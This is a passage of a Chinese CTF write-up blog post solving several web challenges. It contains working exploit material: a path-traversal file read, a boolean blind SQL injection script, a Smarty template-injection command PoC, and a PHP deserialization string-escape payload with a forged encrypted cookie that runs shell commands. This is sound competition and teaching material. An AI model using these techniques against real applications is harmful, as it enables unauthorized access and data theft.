+<p>这里对<code>file</code>参数的过滤其实很鸡肋，所以可以直接读文件。 我们再跟进看一下<code>viewfile()</code>函数:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">viewfile</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(<span class="variable">$this</span>-&gt;fileName)) &#123;</span><br><span class="line">        <span class="variable">$fileContent</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span>-&gt;fileName);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 显示文件内容</span></span><br><span class="line">        <span class="variable">$base64Image</span> = <span class="title function_ invoke__">base64_encode</span>(<span class="variable">$fileContent</span>);</span><br><span class="line">        <span class="variable">$imageType</span> = <span class="title function_ invoke__">pathinfo</span>(<span class="variable">$fileContent</span>, PATHINFO_EXTENSION);</span><br><span class="line">        <span class="variable">$dataUri</span> = <span class="string">&#x27;data:image/&#x27;</span> . <span class="variable">$imageType</span> . <span class="string">&#x27;;base64,&#x27;</span> . <span class="variable">$base64Image</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$dataUri</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;文件不存在。&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>可以看到把读到的内容进行了base64加密，所以思路明晰了：直接传<code>http://39.106.48.123:37903/code/view_file.php?file=../ffffllll44ggg.php</code> F12看到base64加密的字符串，解码就是flag：</p>
+<p><img src="https://img.picui.cn/free/2024/10/21/67163b3850d50.png" alt="集团赛easyweb_1.png"></p>
+<h3 id="login"><a href="#login" class="headerlink" title="login"></a>login</h3><p>sql注入类的题目，一开始尝试万能密码发现不行，尝试弱口令爆破，发现也不行。所以考察的点不在这里。</p>
+<p>当时做题的时候经过一些测试，发现注释符%23、#、空格、select啥的一些都被过滤了，以为这里很难去正常的爆库、爆表、爆字段名了。因为select没了。其实也是因为忘光了都，这里我们的目的是只要把password的值注出来就行了，不用select也行。</p>
+<p><code>username</code>传值:<code>admin&#39;&amp;&amp;if(ascii(substr(password,1,1))&gt;12,1,0)&amp;&amp;&#39;1  </code>， <code>password</code>传值: <code>123</code></p>
+<p>这里就可以得到两种结果，if语句为0或者1的时候，会得到<code> Password incorret</code> 和 <code>login fail</code> 。所以我们可以利用布尔盲注，去把flag注出来，最终的脚本：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span>  requests</span><br><span class="line">url=<span class="string">&quot;http://101.200.139.65:35004/login.php&quot;</span></span><br><span class="line">payload=<span class="string">&quot;admin&#x27;&amp;&amp;if(ascii(substr(password,&#123;&#125;,1))&gt;&#123;mid&#125;,1,0)&amp;&amp;&#x27;1&quot;</span></span><br><span class="line">result = <span class="string">&#x27;&#x27;</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    i = i + <span class="number">1</span></span><br><span class="line">    head = <span class="number">32</span></span><br><span class="line">    tail = <span class="number">127</span></span><br><span class="line">    <span class="keyword">while</span> head &lt; tail:</span><br><span class="line">        mid = (head + tail) &gt;&gt; <span class="number">1</span></span><br><span class="line">        payload = <span class="string">f&quot;admin&#x27;&amp;&amp;if(ascii(substr(password,<span class="subst">&#123;i&#125;</span>,1))&gt;<span class="subst">&#123;mid&#125;</span>,1,0)&amp;&amp;&#x27;1&quot;</span></span><br><span class="line">        data=&#123;<span class="string">&quot;username&quot;</span>:payload,<span class="string">&quot;password&quot;</span>:<span class="number">123</span>&#125;</span><br><span class="line">        r = requests.post(url=url,data=data)</span><br><span class="line">        <span class="comment">#print(r.text)</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;Password&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            head = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            tail = mid</span><br><span class="line">    <span class="keyword">if</span> head != <span class="number">32</span>:</span><br><span class="line">        result += <span class="built_in">chr</span>(head)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure>
+
+<h1 id="个人赛"><a href="#个人赛" class="headerlink" title="个人赛"></a>个人赛</h1><h2 id="ezsmarty"><a href="#ezsmarty" class="headerlink" title="ezsmarty"></a>ezsmarty</h2><p>提示直接把答案给出来了：<code>poc</code>: <code>&#123;block name=&quot;poc*/system(&#39;whoami&#39;);/*&quot;&#125;ABC&#123;/block&#125;</code> ， 然后<code>string:base64:poc</code> ， poc用base64加密一下：</p>
+<p><img src="https://img.picgo.net/2024/10/23/ezsmarty1ced0a1e5bf7a9ba.png" alt="ezsmarty"></p>
+<h2 id="Easy-encrypt"><a href="#Easy-encrypt" class="headerlink" title="Easy_encrypt"></a>Easy_encrypt</h2><p>这个题目主要考察的是PHP反序列化字符串逃逸，其实当时能看出来考点，很久没做了，不知道咋做了。说一下我当时犯迷糊的地方，我当时认为不需要管它是怎么加密和解密的，到最后都会帮我们还原成初始数据，这样考虑确实没错，但是我们在最后的漏洞利用的时候，我们是得去构造序列化字符串的，然而这个得知道加密函数才能去构造：<code>eeeeeend1ng.php</code>是最后的利用点：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(__file__);</span><br><span class="line"><span class="keyword">include_once</span> <span class="string">&quot;algorithm.php&quot;</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">admin</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$admin</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$root</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;root;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="string">&quot;whoami&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Date</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cmd</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$this</span>-&gt;cmd);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">decryptCookie</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;users&#x27;</span>])));</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>可以看到我们传入的数据首先经过<code>base64</code>解密，然后再decryptCookie，所以我们传入的数据是经过加密算法加密然后base64一下的，我们跟进加密算法看一下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">encryptCookie</span>(<span class="params"><span class="variable">$value</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$algorithm</span>,<span class="variable">$secret_key</span>;</span><br><span class="line">    <span class="variable">$key</span> = <span class="variable">$secret_key</span>;</span><br><span class="line">    <span class="variable">$cipher</span> = <span class="variable">$algorithm</span>;</span><br><span class="line">    <span class="variable">$iv</span> = <span class="title function_ invoke__">openssl_random_pseudo_bytes</span>(<span class="title function_ invoke__">openssl_cipher_iv_length</span>(<span class="variable">$cipher</span>));</span><br><span class="line">    <span class="variable">$encryptedValue</span> = <span class="title function_ invoke__">openssl_encrypt</span>(<span class="variable">$value</span>, <span class="variable">$cipher</span>, <span class="variable">$key</span>, <span class="number">0</span>, <span class="variable">$iv</span>) . <span class="string">&#x27;::&#x27;</span> . <span class="title function_ invoke__">bin2hex</span>(<span class="variable">$iv</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$encryptedValue</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>需要拿到<code>algorithm和secret_key</code>的值:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FILE</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$filename</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;filename = <span class="variable">$filename</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">            <span class="variable">$file</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span>-&gt;filename);</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$file</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>刚好这里有一个<code>file_get_contents</code>函数，所以可以用来读<code>config.php</code>文件。</p>
+<p>所以第一步我们得通过反序列化去触发FILE的 <code>__destruct</code> 函数，然后 filename赋值为<code>php://filter/read=convert.base64-encode/resource=config.php</code> 利用伪协议来读。</p>
+<p>那么怎么去触发反序列化漏洞呢？</p>
+<p><code>index.php</code>里面有这样一行代码：</p>
+<p><code>setcookie(&quot;user&quot;, base64_encode(encryptCookie(b(serialize($login)))), time() + 3600, &quot;/&quot;, &quot;&quot;, false, true);</code></p>
+<p>然后<code>login.php</code>里面有这样一行:</p>
+<p><code>unserialize(a(decryptCookie(base64_decode($_COOKIE[&#39;user&#39;]))));</code></p>
+<p>我们跟进看一下b函数：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">b</span>(<span class="params"><span class="variable">$string</span></span>) </span>&#123;</span><br><span class="line">    <span class="comment">// 过滤器</span></span><br><span class="line">    <span class="variable">$escape</span> = <span class="keyword">array</span>(<span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;\\\\&#x27;</span>);</span><br><span class="line">    <span class="variable">$escape</span> = <span class="string">&#x27;/&#x27;</span> . <span class="title function_ invoke__">implode</span>(<span class="string">&#x27;|&#x27;</span>, <span class="variable">$escape</span>) . <span class="string">&#x27;/&#x27;</span>;</span><br><span class="line">    <span class="variable">$string</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="variable">$escape</span>, <span class="string">&#x27;_&#x27;</span>, <span class="variable">$string</span>);</span><br><span class="line">    <span class="variable">$safe</span> = <span class="keyword">array</span>(<span class="string">&#x27;select&#x27;</span>, <span class="string">&#x27;insert&#x27;</span>, <span class="string">&#x27;update&#x27;</span>, <span class="string">&#x27;delete&#x27;</span>, <span class="string">&#x27;where&#x27;</span>,<span class="string">&#x27;extractvalue&#x27;</span>,<span class="string">&#x27;updatexml&#x27;</span>);</span><br><span class="line">    <span class="variable">$safe</span> = <span class="string">&#x27;/&#x27;</span> . <span class="title function_ invoke__">implode</span>(<span class="string">&#x27;|&#x27;</span>, <span class="variable">$safe</span>) . <span class="string">&#x27;/i&#x27;</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_replace</span>(<span class="variable">$safe</span>, <span class="string">&#x27;hacker&#x27;</span>, <span class="variable">$string</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>会把上面$safe里的值替换成hacker，，比如原先的where是5个字符，替换成hacker的6个字符。这样就会造成数据结构的改变。</p>
+<p>之前大佬说的一句话：<strong>凡是数据结构发生改变，都有可能产生安全问题。</strong></p>
+<p>我们可以这样来构造：利用字符串增多的特性，来造成逃逸。我们实际发挥作用注入的代码为：</p>
+<p><code>&quot;;s:6:&quot;status&quot;;O:4:&quot;FILE&quot;:1:&#123;s:8:&quot;filename&quot;;s:59:&quot;php://filter/read=convert.base64-encode/resource=config.php&quot;;&#125;&#125;</code></p>
+<p>一共是113个字符，所以我们得构造113个where，这样被替换成hacker，就会使得我们注入的代码逃逸出来。</p>
+<p>用python来写：<code>&quot;where&quot;*113</code>  ， 最终我们在登录框的username输入：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere&quot;;s:6:&quot;status&quot;;O:4:&quot;FILE&quot;:1:&#123;s:8:&quot;filename&quot;;s:59:&quot;php://filter/read=convert.base64-encode/resource=config.php&quot;;&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>password随意。可以读到config.php的内容。就可以得到secret_key和algorithm的值，接下来就是构造最终的poc：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">admin</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$admin</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$root</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Date</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cmd</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">encryptCookie</span>(<span class="params"><span class="variable">$value</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$key</span> = <span class="string">&quot;Harder_says_nice_to_meet_to&quot;</span>;</span><br><span class="line">    <span class="variable">$cipher</span> =<span class="string">&quot;AES-128-CTR&quot;</span>;</span><br><span class="line">    <span class="variable">$iv</span> = <span class="title function_ invoke__">openssl_random_pseudo_bytes</span>(<span class="title function_ invoke__">openssl_cipher_iv_length</span>(<span class="variable">$cipher</span>));</span><br><span class="line">    <span class="variable">$encryptedValue</span> = <span class="title function_ invoke__">openssl_encrypt</span>(<span class="variable">$value</span>, <span class="variable">$cipher</span>, <span class="variable">$key</span>, <span class="number">0</span>, <span class="variable">$iv</span>) . <span class="string">&#x27;::&#x27;</span> . <span class="title function_ invoke__">bin2hex</span>(<span class="variable">$iv</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$encryptedValue</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$secret_key</span> = <span class="string">&quot;Harder_says_nice_to_meet_to&quot;</span>;</span><br><span class="line"><span class="variable">$algorithm</span> = <span class="string">&quot;AES-128-CTR&quot;</span>;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">admin</span>();</span><br><span class="line"><span class="variable">$d</span> = <span class="keyword">new</span> <span class="title class_">Date</span>();</span><br><span class="line"><span class="variable">$d</span>-&gt;cmd = <span class="string">&quot;cat /flag_aa2cac85700004dff696&quot;</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;root = <span class="variable">$d</span>;</span><br><span class="line"><span class="variable">$temp</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$temp</span> = <span class="title function_ invoke__">encryptCookie</span>(<span class="variable">$temp</span>);</span><br><span class="line"><span class="variable">$temp</span> = <span class="title function_ invoke__">base64_encode</span>(<span class="variable">$temp</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$temp</span>;</span><br></pre></td></tr></table></figure>
+
+<p>在eeeeeend1ng.php下利用，抓包该一下cookie里面的users字段，传过去即可。</p>
+<h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><p>1.生成的时候注意<code>php</code>版本，用7的话没有报错，用5.45的时候会产生warning，加密算法会有些问题。</p>
+<p>2.最后抓包在cookie那里传值的时候注意，因为一开始那个地方给的是user，而我们实际上得传的是users，所以得改一下。</p>
+<p>3.字符串逃逸分为两种，一种是利用字符串增多，一种是利用字符串减少。增多的时候，我们可以直接先把想要逃逸的字符串写好，然后看多少字符，前面拼上即可。</p>
+<p>比如这里的<code>&quot;;s:xxxx</code>，前面的<code>&quot;;</code>都是为了闭合上一个属性的值。然后后面就是我们正常构造的序列化字符串格式。</p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/CTF/" rel="tag"># CTF</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2024/10/19/sql%E6%B3%A8%E5%85%A5%E5%88%B7%E9%A2%98/" rel="prev" title="sql注入刷题">
+                  <i class="fa fa-angle-left"></i> sql注入刷题
+                </a>
+            </div>
+            <div class="post-nav-item">
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2024</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">My0n9s</span>
+  </div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/pisces/" rel="noopener" target="_blank">NexT.Pisces</a>
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="Back to top">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/sidebar.js"></script><script src="/js/next-boot.js"></script>
+
+  
+
+
+
+
+
+
+  
+
+
+
+
+
+</body>
+</html>
